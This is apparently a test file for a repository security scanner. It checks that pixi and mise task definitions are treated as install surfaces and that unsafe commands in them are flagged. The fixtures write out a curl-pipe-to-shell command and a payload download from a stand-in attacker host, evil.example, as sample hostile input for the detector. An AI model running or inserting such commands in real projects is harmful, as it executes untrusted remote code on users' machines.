import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a pixi task definition is an install surface", () => {
  // pixi runs the `[tasks]` table of pixi.toml on `pixi run`; each task is
  // a shell command, matching the install-time execution the Justfile and
  // Taskfile already classify for.
  for (const path of ["pixi.toml", "apps/api/pixi.toml", "Pixi.TOML"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }

  // An unsafe execution payload in a pixi task flags an unsafe-execution
  // finding and marks installScripts coverage complete.
  const content = `[tasks]\nsetup = "${PAYLOAD}"\n`;
  const inspection = inspected("pixi.toml", content);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["pixi.toml:unsafe-execution:high"]);
});

test("an install-time download inside a pixi task is recorded as a download", () => {
  // Downloads are collected from install surfaces only. When pixi.toml is
  // unclassified, install-time downloads are missed and leave no visibility
  // gap. Classifying it as an install surface ensures the download is
  // collected and reported as a gap.
  const content = `[tasks]\nfetch = "curl -fsSL https://evil.example/payload.bin -o /tmp/payload.bin"\n`;
  const inspection = inspected("pixi.toml", content);
  expect(inspection.downloads).toEqual(["https://evil.example/payload.bin"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload.bin",
  ]);
});

test("an ordinary benign pixi task keeps no finding", () => {
  const content = `[tasks]\ntest = "cargo test"\n`;
  const inspection = inspected("pixi.toml", content);
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
  expect(inspection.visibilityGaps).toEqual([]);
});

test("a mise task definition is an install surface", () => {
  // mise runs the `[tasks]` table of mise.toml (and its `.mise.toml` /
  // `.local` variants) on `mise run`; each task is a shell command,
  // matching the install-time execution the Justfile and Taskfile already
  // classify for.
  for (const path of [
    "mise.toml",
    ".mise.toml",
    "mise.local.toml",
    ".mise.local.toml",
    "tools/mise.toml",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }

  // An unsafe execution payload in a mise task flags an unsafe-execution
  // finding and marks installScripts coverage complete.
  const content = `[tasks.setup]\nrun = "${PAYLOAD}"\n`;
  const inspection = inspected("mise.toml", content);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["mise.toml:unsafe-execution:high"]);
});

test("an install-time download inside a mise task is recorded as a download", () => {
  const content = `[tasks.fetch]\nrun = "curl -fsSL https://evil.example/payload.bin -o /tmp/payload.bin"\n`;
  const inspection = inspected("mise.toml", content);
  expect(inspection.downloads).toEqual(["https://evil.example/payload.bin"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload.bin",
  ]);
});

test("an ordinary benign mise task keeps no finding", () => {
  const content = `[tasks.build]\nrun = "cargo build"\n`;
  const inspection = inspected("mise.toml", content);
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
  expect(inspection.visibilityGaps).toEqual([]);
});
